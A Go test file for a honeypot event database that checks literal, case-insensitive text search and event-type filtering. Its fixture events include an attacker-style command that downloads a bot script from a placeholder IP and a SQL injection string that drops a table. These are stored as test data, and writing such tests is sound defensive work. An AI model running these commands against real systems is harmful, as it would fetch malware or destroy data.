package database

import (
	"context"
	"fmt"
	"sort"
	"strings"
	"testing"
	"time"
)

// checkEventTextAndTypeFilters stores events whose username, password,
// command and payload carry characters SQL and search syntaxes give a
// meaning to, and checks that EventFilter.Text matches them literally and
// case-insensitively, and that EventTypes filters. The events get a honeypot
// name of their own, so a shared database's other rows do not count.
// searchPayload is false for a backend that does not search the payload.
func checkEventTextAndTypeFilters(t *testing.T, db Database, refresh func(), searchPayload bool) {
	t.Helper()
	ctx := context.Background()
	hp := fmt.Sprintf("txt%d", time.Now().UnixNano()%1e9)
	now := time.Now().UTC().Truncate(time.Millisecond)
	evs := []*Event{
		{Username: "root", Password: "100%_pure", Command: "uname -a", EventType: "login"},
		{Username: "o'brien", Password: `back\slash`, Command: `echo "x" ; DROP TABLE events; --`, EventType: "login"},
		{Username: "admin", Password: "pw", Command: "wget http://198.51.100.9/BOT.sh", EventType: "command"},
		{Username: "Ünïcode", Password: "pw", Command: "cat *.log ?x [a-z]", EventType: "command"},
		{Username: "nul", Password: "a b", Command: "ls", EventType: "command"}, // no NUL stored
		{Username: "pl", Password: "pw", Command: "id", Payload: []byte("GET /secret-PAYLOAD-marker HTTP/1.1"), EventType: "http"},
	}
	for i, e := range evs {
		e.Timestamp = now.Add(time.Duration(i) * time.Millisecond)
		e.Honeypot = hp
		e.SourceIP = fmt.Sprintf("198.51.100.%d", 10+i)
		e.Protocol = "tcp"
	}
	if err := db.InsertEvents(ctx, evs); err != nil {
		t.Fatal(err)
	}
	if refresh != nil {
		refresh()
	}
	users := func(f EventFilter) []string {
		t.Helper()
		f.Honeypots = []string{hp}
		f.Limit = 100
		got, err := db.GetEvents(ctx, f)
		if err != nil {
			t.Fatalf("GetEvents(%+v): %v", f, err)
		}
		var u []string
		for _, e := range got {
			u = append(u, e.Username)
		}
		sort.Strings(u)
		return u
	}
	payloadHit := []string(nil)
	if searchPayload {
		payloadHit = []string{"pl"}
	}
	for _, c := range []struct {
		text string
		want []string
	}{
		{"%", []string{"root"}},             // a LIKE wildcard, matched literally
		{"_", []string{"root"}},             // likewise
		{"100%_", []string{"root"}},         // both, in place
		{"'", []string{"o'brien"}},          // a quote
		{`\`, []string{"o'brien"}},          // a backslash
		{`back\sl`, []string{"o'brien"}},    // with text around it
		{`"x" ; DROP`, []string{"o'brien"}}, // SQL in the term
		{"bot.SH", []string{"admin"}},       // case-insensitive
		{"*", []string{"Ünïcode"}},          // wildcard characters of
		{"?x [a-z]", []string{"Ünïcode"}},   // Elasticsearch and globs
		{"ÜNÏ", []string{"Ünïcode"}},        // case-insensitive beyond ASCII
		{"payload-MARKER", payloadHit},      // the payload
		{"no such text anywhere", nil},
		{strings.Repeat("x", MaxEventText), nil},
		{strings.Repeat("'\\%", 4096), nil}, // far past what the API passes
	} {
		if got := users(EventFilter{Text: c.text}); strings.Join(got, ",") != strings.Join(c.want, ",") {
			t.Errorf("Text %.40q: got %q, want %q", c.text, got, c.want)
		}
	}
	// A NUL in the term is refused by the API; the backends must not fail
	// open on one either.
	f := EventFilter{Text: "\x00", Honeypots: []string{hp}, Limit: 100}
	if got, err := db.GetEvents(ctx, f); err == nil && len(got) > 1 {
		t.Errorf("Text NUL matched %d events", len(got))
	}

	if got := users(EventFilter{EventTypes: []string{"command"}}); strings.Join(got, ",") != "admin,nul,Ünïcode" {
		t.Errorf("EventTypes command: %q", got)
	}
	if got := users(EventFilter{EventTypes: []string{"login"}, Text: "root"}); strings.Join(got, ",") != "root" {
		t.Errorf("EventTypes + Text: %q", got)
	}
}
